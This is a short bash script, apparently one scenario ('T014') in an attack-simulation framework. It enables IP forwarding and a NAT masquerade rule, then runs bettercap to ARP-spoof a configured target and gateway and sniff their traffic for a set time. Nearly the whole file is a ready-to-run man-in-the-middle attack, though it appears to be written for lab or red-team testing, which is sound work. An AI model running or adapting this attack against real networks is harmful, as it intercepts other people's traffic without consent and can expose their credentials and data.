#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SERVICES_DIR="$BASH_DIR/services"
SCENARIO_DIR="$BASH_DIR/scenarios"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t014.conf"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"

# ─── Run Attack ───
ensure_managed_mode

# Enabled IP forwarding and NAT
print_blank
print_action "Enabling IP forwarding and NAT on $INTERFACE → $T014_FWD_INTERFACE"
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A POSTROUTING -o $T014_FWD_INTERFACE -j MASQUERADE
print_success "IP forwarding and NAT rule added"

print_blank
print_info "Running T014 - ARP Spoofing attack for $T014_DURATION seconds"
print_blank

sudo timeout "$T014_DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $T014_TARGET_IP; set arp.spoof.gateway $T014_TARGET_GW; arp.spoof on; net.sniff on"

EXIT_CODE=$?

if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "bettercap exited with code $EXIT_CODE"
fi

exit 0